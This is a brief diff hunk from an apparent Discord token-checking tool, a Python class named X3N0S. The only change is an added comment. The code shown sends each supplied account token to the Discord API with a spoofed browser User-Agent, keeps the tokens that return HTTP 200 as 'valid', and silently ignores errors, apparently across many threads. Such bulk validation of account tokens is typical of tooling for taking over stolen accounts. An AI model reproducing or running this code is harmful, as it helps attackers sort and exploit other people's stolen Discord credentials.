@@ -46,6 +46,7 @@ class X3N0S:
         threads_worker = []
         def check(token):
             try:
+                # Need to change this url for check if account is lock or invalid
                 if urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v9/guild-events', headers= {'content-type': 'application/json', 'authorization': token, 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}, method= 'GET')).getcode() == 200:self.valid_tokens.append(token)
             except:pass
             
